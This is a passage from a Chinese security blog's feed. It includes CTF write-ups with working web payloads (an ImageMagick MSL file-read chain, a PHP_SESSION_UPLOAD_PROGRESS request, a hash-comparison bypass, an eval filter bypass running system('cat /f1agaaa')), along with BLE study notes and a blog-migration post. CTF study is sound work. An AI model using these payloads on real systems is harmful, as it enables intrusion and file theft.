punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+4<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+4<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+5<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+5<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一些脏trick"><a href="#一些脏trick" class="headerlink" title="一些脏trick"></a>一些脏trick</h3><h4 id="php-session-not-started"><a href="#php-session-not-started" class="headerlink" title="php session not started"></a>php session not started</h4><p>想办法整个session，利⽤SESSION UPLOAD PROGRESS创建⼀个 session，这样就可以看到源码了</p><pre class="line-numbers language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> 115.239.215.75:8081<span class="token header-name keyword">Cookie:</span> PHPSESSID=1<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Length:</span> 204--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="PHP_SESSION_UPLOAD_PROGRESS";<span class="token header-name keyword">Content-Type:</span> application/octet-stream1--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="绕过md5以及sha1强比较"><a href="#绕过md5以及sha1强比较" class="headerlink" title="绕过md5以及sha1强比较"></a>绕过md5以及sha1强比较</h4><p>利用 Error&#x2F;Exception 内置类进行hash绕过。</p><p><code>$a = new Error(&quot;null&quot;,1);$b = new Error(&quot;null&quot;,1);</code></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
            <tag> PHP安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>换博客啦</title>
      <link href="/2022/11/14/huan-bo-ke-la/"/>
      <url>/2022/11/14/huan-bo-ke-la/</url>
      
        <content type="html"><![CDATA[<p>一年前买的HUAWEI云服务器即将过期，想来这已经是我第三个过期的服务器了-.-<br>记得当时花几十块钱就能买到一台配置还不错的服务器。心想国内厂商真大气，毕竟当时也考察过vultr、青瓦台等国外的vps，一年要一百多块钱。<br>如今点开控制台一看续费价格人要晕掉了，这tmd是抢钱啊！！！客服之前还来了三个电话跟我说服务器续费有优惠，难不成一个月1800的价格是优惠？<br>于是我决定永久把博客迁移到github上去。静态博客只知道<code>hexo</code>了，大家也都在用这个。相比于笨重的<code>Zblog</code>来说<code>hexo</code>就轻量多了，主题也非常丰富，并且不需要费大量时间来维护。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 国内服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低功耗蓝牙BLE简述</title>
      <link href="/2022/11/01/ble-xue-xi-bi-ji/"/>
      <url>/2022/11/01/ble-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="BLE简述"><a href="#BLE简述" class="headerlink" title="BLE简述"></a>BLE简述</h3><ul><li>BLE（低能耗蓝牙）首次出现在蓝牙规范4.0版本中。BLE是作为其前身经典蓝牙BR&#x2F;EDR的替代。下图是传统蓝牙（BT）与BLE的区别，从图可知相比BT，BLE的功耗小，支持距离大。</li></ul><div align=center><img src="https://img-blog.csdnimg.cn/20210513101058738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FsZXhjZWw=,size_16,color_FFFFFF,t_70" alt="摘录" style="zoom:100%;" /></div><ul><li><p>BLE除了点对点通信，还支持广播模式：允许一个设备同时向无限数量的接收者传输数据。每个设备都能与网络中的任何其他设备进行通信。其中，点对点通信包括面向连接通信以及无连接通信，广播模式只有无连接通信（废话QAQ）。</p></li><li><p>BLE的频段和WIFI一样都是2.402 – 2.480 GHz，每个信道之间间隔为2hz，因此有40个信道。其中37，38，39为广播信道，这里需要说明37,38,39只是逻辑顺序(即Channel Index)，从物理信道上看是隔着好几条信道的，这是因为要防止收到数据传输信道的干扰导致三条广播信道全部无法正常工作。其它37个为数据传输信道。下表为蓝牙官方给出BLE与经典蓝牙的区别。</p></li></ul><table><thead><tr><th align="center">Attribution</th><th align="center">Bluetooth Low Energy (LE)</th><th align="center">Bluetooth Classic</th></tr></thead><tbody><tr><td align="center">频段范围</td><td align="center">2.4GHz ISM Band (2.402 – 2.480 GHz Utilized)</td><td align="center">2.4GHz ISM Band (2.402 – 2.480 GHz Utilized)</td></tr><tr><td align="center">信道</td><td align="center">40 channels with 2 MHz spacing (3 advertising channels&#x2F;37 data channels)</td><td align="center">79 channels with 1 MHz spacing</td></tr><tr><td align="center">通道使用信息</td><td align="center">FHSS（跳频）</td><td align="center">FHSS（跳频）</td></tr><tr><td align="center">调制技术</td><td align="center">GFSK</td><td align="center">GFSK, π&#x2F;4 DQPSK, 8DPSK</td></tr><tr><td align="center">传输速率</td><td align="center">LE 2M PHY: 2 Mb&#x2F;s LE 1M PHY: 1 Mb&#x2F;s LE Coded PHY (S&#x3D;2): 500 Kb&#x2F;s LE Coded PHY (S&#x3D;8): 125 Kb&#x2F;s</td><td align="center">EDR PHY (8DPSK): 3 Mb&#x2F;s EDR PHY (π&#x2F;4 DQPSK): 2 Mb&#x2F;s BR PHY (GFSK): 1 Mb&#x2F;s</td></tr><tr><td align="center">发射速率</td><td align="center">≤ 100 mW (+20 dBm)</td><td align="center">≤ 100 mW (+20 dBm)</td></tr><tr><td align="center">Rx Sensitivity</td><td align="center">LE 2M PHY: ≤-70 dBm LE 1M PHY: ≤-70 dBm LE Coded PHY (S&#x3D;2): ≤-75 dBm LE Coded PHY (S&#x3D;8): ≤-82 dBm</td><td align="center">≤-70 dBm</td></tr><tr><td align="center">数据传输</td><td align="center">Asynchronous Connection-oriented Isochronous Connection-oriented Asynchronous Connectionless Synchronous Connectionless Isochronous Connectionless</td><td align="center">Asynchronous Connection-oriented Synchronous Connection-oriented</td></tr><tr><td align="center">通信手段</td><td align="center">Point-to-Point (including piconet) Broadcast Mesh</td><td align="center">Point-to-Point (including piconet)</td></tr><tr><td align="center">Positioning Features</td><td align="center">Presence: Advertising Direction: <a href="https://www.bluetooth.com/zh-cn/learn-about-bluetooth/recent-enhancements/direction-finding/">Direction Finding</a> (AoA&#x2F;AoD) Distance: RSSI, <a href="https://www.bluetooth.com/zh-cn/specifications/in-development/">HADM</a> (Coming)</td><td align="center">None</td></tr></tbody></table><ul><li>想想蓝牙的应用，如手机与蓝牙耳机、电脑与无线鼠标，显然他们是C&#x2F;S架构。一般而言设备提供服务，因此设备是server，手机使用设备提供的服务，因此手机是client。我们称client为主机，server为从机。</li><li>对于蓝牙服务端设备而言（注意我们只关注BLE通信），它们收集信息存储起来，客户端发送一条命令实际上就是获取服务端存储起来的数据。因此可以说服务其实就是各种有价值的数据。</li></ul><h3 id="BLE规格"><a href="#BLE规格" class="headerlink" title="BLE规格"></a>BLE规格</h3><p>官方文档截的图，目前还不太能理解，等理解深刻之后才回来看看。</p><div align=center><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221026181024001.png" alt="image-20221026181024001" style="zoom:67%;" /></div><h3 id="物理信道"><a href="#物理信道" class="headerlink" title="物理信道"></a>物理信道</h3><p>在总结中已经提到，BLE 工作在 2.4GHz 的频段上，分为 40 个 RF 信道，每个信道间隔2MHZ。同一时刻，只能用一个信道进行数据的传输&#x2F;接收。</p><p>这 40 个 RF Channel 上，并不是平等的， 可以看到SIG 把物理信道转换成为一个叫做 Channel Index 。物理信道从 0 - 39 进行编号。而Channel Index为PHY Ch0 对应 37，PHY Ch12 对应 38，PHY 39 对应 39：</p><div align=center><img src="https://img-blog.csdnimg.cn/2019070323511170.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pob3V0YW9wb3dlcg==,size_16,color_FFFFFF,t_70" alt="img" style="zoom:67%;" /></div><p>问：为什么这三个广播信道之间隔好几个信道？</p><p>答：因为如WIFI也用的2.4GHZ，很有可能蓝牙信号被干扰，而广播信道隔开设计就是为了避免数据信道被干扰导致广播信道不可用。偷个图说明：</p><div align=center><img src="https://pic1.zhimg.com/v2-b98249bf73445515154af85f462326b8_r.jpg" referrerpolicy="no-referrer" alt="img"></div><p>除了 37、38、39 这些频段，在 Connection 状态下使用了 其他的 37 个 Channel，通过跳频技术（Hopping），来减少数据干扰，增强系统的可靠性。</p><h3 id="BLE协议栈"><a href="#BLE协议栈" class="headerlink" title="BLE协议栈"></a>BLE协议栈</h3><h4 id="协议栈层次结构"><a href="#协议栈层次结构" class="headerlink" title="协议栈层次结构"></a>协议栈层次结构</h4><p>下图说明了BLE的协议栈构成。可以看到本身蓝牙官方定义协议栈是由Profiles，HOST主机和Controller控制器组成。 其中在HOST和Controller之中由主机控制器接口（HCI）连接，HCI是它们之间的逻辑接口，注意不是物理组件。在底层物理传输方面，HCI可以用许多不同的方式实现，但逻辑或功能接口总是相同的。</p><p>为了更好理解我们把协议栈分为应用层，协议栈以及radio。协议栈之上就是application应用层，也叫Profiles，一个Profile就是一个功能。比如电池，睡眠，心率这些常见蓝牙设备提供的功能。</p><p>可以看到BLE协议栈自成体系。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221102144739324.png" alt="image-20221102144739324" style="zoom:50%;align:center;"/><h4 id="协议栈各层-x2F-协议职能"><a href="#协议栈各层-x2F-协议职能" class="headerlink" title="协议栈各层&#x2F;协议职能"></a>协议栈各层&#x2F;协议职能</h4><p>知识还是比较多的，先总结一下各层职能，之后再详细去看。</p><h5 id="Physical-Layer-物理层"><a href="#Physical-Layer-物理层" class="headerlink" title="Physical Layer 物理层"></a>Physical Layer 物理层</h5><p>物理层定义了无线电发射器&#x2F;接收器如何用于编码和解码数字数据的传输和接收，以及其他适用的无线电相关参数和属性。</p><h5 id="Link-Layer-链路层"><a href="#Link-Layer-链路层" class="headerlink" title="Link Layer 链路层"></a>Link Layer 链路层</h5><p>LL层是整个BLE协议栈的核心。这一层定义了空中接口数据包的格式，具体在哪一个时间点把数据包发送出去，怎么保证数据的完整性，ACK如何接收，如何进行重传，以及如何对链路进行管理和控制等等。LL层不负责解析，只规定格式，对数据进行怎样的解析则交给上面的GAP或者ATT。</p><h5 id="HCI-主机-控制-接口"><a href="#HCI-主机-控制-接口" class="headerlink" title="HCI 主机-控制-接口"></a>HCI 主机-控制-接口</h5><p>HOST和Controller之间的桥梁。为HOST和Controller之间的命令和数据的双向通信提供一个明确的功能接口。</p><h5 id="L2CAP层"><a href="#L2CAP层" class="headerlink" title="L2CAP层"></a>L2CAP层</h5><p>对上层进行多路复用，支持对上层PDU的分割和重组，支持流量控制。LL只关心传输的数据自己，L2CAP就要区分是加密通道仍是普通通道，同时还要对链接间隔进行管理。</p><h5 id="ATT-数据交互协议"><a href="#ATT-数据交互协议" class="headerlink" title="ATT 数据交互协议"></a>ATT 数据交互协议</h5><p>ATT层用来定义用户命令及命令操作的数据，它的关键就是命令。</p><p>ATT命令可以大致分为4类：read读，write写，notify(通知)和indicate(指示)。这些命令又可以分成两种：如果它需要response，那么会在相应命令后面加上request；相反，如果它只需要ACK而不需要response，那么它的后面就不会带request。<strong>ATT的每个命令发出去之后，会立马等ACK信息，如果收到了ACK包，发送方认为命令完成；否则发送方会一直重传该命令直到超时导致BLE连接断开</strong>。</p><p>BLE协议栈中，开发者接触最多的就是ATT。<strong>BLE引入了attribute概念，用来描述一条一条的数据</strong>。Attribute除了定义数据，同时定义该数据可使用的ATT命令，所以这一层被称为ATT层。注意：ATT也是蓝牙空口包中的最上层</p><h5 id="SMP-安全管理层"><a href="#SMP-安全管理层" class="headerlink" title="SMP 安全管理层"></a>SMP 安全管理层</h5><p>SMP用来管理BLE链接的加密和安全，如何保证链接的安全性，同时不影响用户的体验。</p><h5 id="GATT"><a href="#GATT" class="headerlink" title="GATT"></a>GATT</h5><p>GATT用来规范attribute中的数据内容，并运用group（分组）的概念对attribute进行分类管理。没有GATT，BLE协议栈也能跑，但互联互通就会出问题，也正是由于有了GATT和各类各样的应用profile，BLE摆脱了ZigBee等无线协议的兼容性困境，成了出货量最大的2.4G无线通讯产品。</p><h5 id="GAP"><a href="#GAP" class="headerlink" title="GAP"></a>GAP</h5><p>定义了在非连接状态下可使用的操作模式和程序，比如发起广播，扫描和发起连接。定义了安全级别和模式。</p><h3 id="BLE连接状态及过程"><a href="#BLE连接状态及过程" class="headerlink" title="BLE连接状态及过程"></a>BLE连接状态及过程</h3><p>BLE设备有七种状态：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221102145101332.png" alt="image-20221102145101332" style="zoom:80%;align:center" /><h4 id="就绪态-Standby"><a href="#就绪态-Standby" class="headerlink" title="就绪态 Standby"></a>就绪态 Standby</h4><p>可以理解为摆烂状态。</p><p>处于就绪态的链路层什么也不干，一旦链路层接收到应用层指令那么设备就会进入到相应的状态，一旦设备空闲下来，则又会进入就绪态。</p><h4 id="广播态-Advertising"><a href="#广播态-Advertising" class="headerlink" title="广播态 Advertising"></a>广播态 Advertising</h4><p>广播态的功能，就是让周围设备能够发现自己。</p><p>处于广播态的链路层会发送广播报文，该报文会被周围设备搜索并解析出来，广播报文的内容包括了设备是否可被连接，设备的名字，设备的地址，设备提供的服务及其他相关信息。收到广播报文的设备可以发送回应报文，广播态的链路层还可以监听这种回应报文，并作出响应。</p><h4 id="扫描态-Scanning"><a href="#扫描态-Scanning" class="headerlink" title="扫描态 Scanning"></a>扫描态 Scanning</h4><p>扫描态的主要功能，就是接受广播报文以发现周围的设备。扫描过程可以分为主动扫描和被动扫描。</p><p>被动扫描，就是监听（广播）信道，并且不会向周围发送任何报文，周围设备发送的非定向广播报文都可以被接收到。非定向报文是指，没有指定报文接收地址的报文。</p><p>主动扫描，就是主动发出扫描请求的报文，处于广播状态的链路层会监听这种报文，收到广播报文后还可以发送报文询问详细信息，接收方收到报文后会发出回应报文，这种回应报文是定向报文，只能被发出扫描请求的设备接收并解析出来。</p><h4 id="连接态-Connecting"><a href="#连接态-Connecting" class="headerlink" title="连接态 Connecting"></a>连接态 Connecting</h4><p>连接态，顾名思义就是设备连接建立完成之后的状态，从应用层的角度来看，两个设备已经成功建立了物理连接，并且可以交互用户数据了。</p><h4 id="发起态-Initiating"><a href="#发起态-Initiating" class="headerlink" title="发起态 Initiating"></a>发起态 Initiating</h4><p>发起态，是准备发起连接到连接完成前的一段状态，它的功能是完成连接所需要的所有过程。</p><h4 id="等时广播状态-Isochronous-Broadcasting"><a href="#等时广播状态-Isochronous-Broadcasting" class="headerlink" title="等时广播状态 Isochronous Broadcasting"></a>等时广播状态 Isochronous Broadcasting</h4><p>等时广播状态可以通过广播通道发送BIS(Broadcast Isochronous Stream) 数据报文，由Standby状态进入。想向一定区域内其它设备广播同步数据流（比如音频数据流）的设备需要处于Isochronous Broadcasting状态，处于该状态的设备称为Isochronous Broadcaster。处于Isochronous Broadcasting状态的链路层状态机应发送由一个或多个BIS 组成的BIG(Broadcast Isochronous Group)，每个BIG最多包含31个BIS，每个BIS承载一个单独的同步数据流。传输第一个BIS 数据报文后链路层应通知主机，若停止同步广播则回到Standby状态。</p><p>总而言之，这玩意儿有点像并发，貌似QOS的拥塞控制的定制队列也是这个思想（把数据包分成不同的队列，轮询的向队列取数据，每次只取一个）</p><h4 id="同步接收状态-Synchronization"><a href="#同步接收状态-Synchronization" class="headerlink" title="同步接收状态 Synchronization"></a>同步接收状态 Synchronization</h4><p>可以通过广播通道接收BIS同步数据流，由Standby状态进入。Synchronization状态可用于侦听一定区域内的BIS广播同步数据流（比如音频数据流），处于Synchronization状态并且正在接收同步数据包的设备称为Synchronized Receiver，只能单向接收BIG，如果在主机指定时间内未侦听到任何有效BIG，处于该状态的设备将回到Standby状态并通知主机。</p><h4 id="Isochronous-Broadcaster-—-Synchronized-Receiver"><a href="#Isochronous-Broadcaster-—-Synchronized-Receiver" class="headerlink" title="Isochronous Broadcaster — Synchronized Receiver"></a>Isochronous Broadcaster — Synchronized Receiver</h4><p>给出一篇博客的例子。</p><p>等时广播者与同步接收者之间通过广播信道传输同步数据流BIS（比如音频数据流），等时同步广播通信也是一种一对多的通信方式，是在Bluetooth 5.2 中新增的，同样只能进行单方向通信，比如可以让听讲座的众多观众借助支持该通信模式的蓝牙耳机同步听到一个演讲者等时广播的音频数据流；</p><h4 id="常见连接示例"><a href="#常见连接示例" class="headerlink" title="常见连接示例"></a>常见连接示例</h4><p>比如手机A要连接华为手环B，首先华为手环B进入广播态向周围设备发起广播报文，A进入扫描态通过scanner模块接受B发的广播报文，发现该设备信息后，A进入发起态，向B发起连接请求，B接收到连接请求后，确认是与本身通讯向广播者发响应信息，这样当广播者和接受者都有了对方的身份信息时，即表示双方连接成功，A、B进入连接态。<br>手机A：Standby—-&gt;Scanning—-&gt;Initiating—-&gt;Connection</p><p>华为手环B：Standby—-&gt;Advertising—-&gt;Connection</p><p>此时我们把手机A称为主机，华为手环B称为从机。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>1.<a href="https://www.cnblogs.com/iini/p/12334646.html">https://www.cnblogs.com/iini/p/12334646.html</a></p><p>2.<a href="http://www.javashuo.com/article/p-ajgbndml-nv.html">http://www.javashuo.com/article/p-ajgbndml-nv.html</a></p><p>3.<a href="https://blog.csdn.net/linan101/article/details/110478851">https://blog.csdn.net/linan101/article/details/110478851</a></p><p>4.<a href="https://blog.csdn.net/m0_37621078/article/details/107697019">https://blog.csdn.net/m0_37621078/article/details/107697019</a></p><p>5.<a href="https://www.cnblogs.com/ethan-yan/p/14681938.html">https://www.cnblogs.com/ethan-yan/p/14681938.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BLE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow新手杯 部分WP</title>
      <link href="/2022/10/05/ctfshow-xin-shou-bei-bu-fen-wp/"/>
      <url>/2022/10/05/ctfshow-xin-shou-bei-bu-fen-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我确实是新手。</p></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"?>"</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//中止</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?&gt;提前中止php，后面就不会执行代码了。因此$code需要传一个php标签，但str_replace过滤了问号。考虑用script风格标签。一开始没想到script风格标签导致卡了很久555。</p><p>payload:</p><pre class="line-numbers language-javascript"><code class="language-javascript">code<span class="token operator">=</span><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /f1agaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005221523758.png" alt="image-20221005221523758" style="zoom:50%;" /><h4 id="剪刀石头布"><a href="#剪刀石头布" class="headerlink" title="剪刀石头布"></a>剪刀石头布</h4><p>连续猜拳赢100次得到flag（耍你的</p><p>审计代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$play</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span> <span class="token operator">=</span> <span class="token string">'/tmp/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.log'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//略</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;h5>Game History&lt;/h5>\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;div class='all_output'>\n"</span><span class="token punctuation">;</span>                